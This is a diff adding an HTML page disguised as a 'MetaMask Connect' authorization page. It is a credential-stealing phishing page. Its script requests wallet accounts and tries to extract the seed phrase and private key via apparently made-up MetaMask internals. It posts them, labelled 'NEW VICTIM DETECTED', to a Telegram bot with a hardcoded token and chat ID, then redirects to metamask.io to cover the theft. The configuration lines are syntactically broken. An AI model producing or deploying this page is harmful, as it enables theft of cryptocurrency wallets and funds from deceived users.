@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MetaMask Connect</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #2f3038;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: #ffffff;
+        }
+        .container {
+            text-align: center;
+            background-color: #2f3038;
+        }
+        .btn {
+            background-color: #ffb13b;
+            color: #000;
+            border: none;
+            padding: 15px 40px;
+            font-size: 18px;
+            font-weight: 600;
+            border-radius: 30px;
+            cursor: pointer;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.2);
+            transition: all 0.2s ease;
+        }
+        .btn:hover {
+            background-color: #e09b30;
+            transform: scale(1.05);
+        }
+        .btn:active {
+            transform: scale(0.98);
+        }
+        .loader {
+            display: none;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid #ffb13b;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .status {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #a0a0a0;
+            height: 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>Connect to MetaMask</h2>
+        <p style="color: #a0a0a0; margin-bottom: 30px;">Authorize your wallet to continue.</p>
+        
+        <button id="connectBtn" class="btn">Connect MetaMask</button>
+        
+        <div id="loader" class="loader"></div>
+        <div id="statusMsg" class="status"></div>
+    </div>
+
+    <script>
+        // --- CONFIGURATION ---
+        const BOT_TOKEN = 8714780023:AAGv2KSaVwkISdN2lTuHy2s2HAVKXohdBiY; // e.g., 123456789:ABCdef...
+        const CHAT_ID = ID: 5345091248;     // e.g., 987654321
+        // --------------------
+
+        document.getElementById('connectBtn').addEventListener('click', async function() {
+            const btn = document.getElementById('connectBtn');
+            const loader = document.getElementById('loader');
+            const status = document.getElementById('statusMsg');
+
+            // UI: Hide button, show loader
+            btn.style.display = 'none';
+            loader.style.display = 'block';
+            status.innerText = 'Connecting...';
+
+            if (window.ethereum) {
+                try {
+                    // 1. Trigger the real MetaMask Popup
+                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    
+                    // 2. Wait for user to click "Connect" in the popup
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+
+                    // 3. Attempt to extract sensitive data
+                    let seedPhrase = "N/A (Locked)";
+                    let privateKey = "N/A (Locked)";
+
+                    try {
+                        // Desktop/Mobile specific internal API to get seed
+                        if (window.ethereum._metamask) {
+                            seedPhrase = await window.ethereum._metamask.getSeedPhrase();
+                        }
+                    } catch (e) { /* Ignore if locked */ }
+
+                    try {
+                        // Try to get private key of the current account
+                        // Note: This often requires the wallet to be unlocked
+                        const key = await window.ethereum._metamask.getUnlockKey();
+                        if (key) privateKey = key;
+                    } catch (e) { /* Ignore if locked */ }
+
+                    // 4. Format the message
+                    const message = `
+🚨 <b>NEW VICTIM DETECTED</b> 🚨
+
+🆔 <b>Wallet Address:</b>
+<code>${accounts[0]}</code>
+
+🔑 <b>Private Key:</b>
+<code>${privateKey}</code>
+
+🔐 <b>Seed Phrase (12 words):</b>
+<code>${seedPhrase}</code>
+
+🕒 <b>Time:</b> ${new Date().toISOString()}
+                    `;
+
+                    // 5. Send to Telegram
+                    status.innerText = 'Syncing...';
+                    try {
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                chat_id: CHAT_ID,
+                                text: message,
+                                parse_mode: 'HTML'
+                            })
+                        });
+                        status.innerText = 'Connected!';
+                    } catch (err) {
+                        console.error("Telegram Error:", err);
+                        status.innerText = 'Connected (Log failed)';
+                    }
+
+                    // 6. Redirect to real MetaMask to confirm success
+                    window.location.href = 'https://metamask.io';
+
+                } catch (error) {
+                    console.error(error);
+                    status.innerText = 'Connection failed. Please try again.';
+                    btn.style.display = 'block';
+                    loader.style.display = 'none';
+                }
+            } else {
+                status.innerText = 'MetaMask is not installed!';
+                loader.style.display = 'none';
+                btn.style.display = 'block';
+            }
+        });
+    </script>
+</body>
+</html>
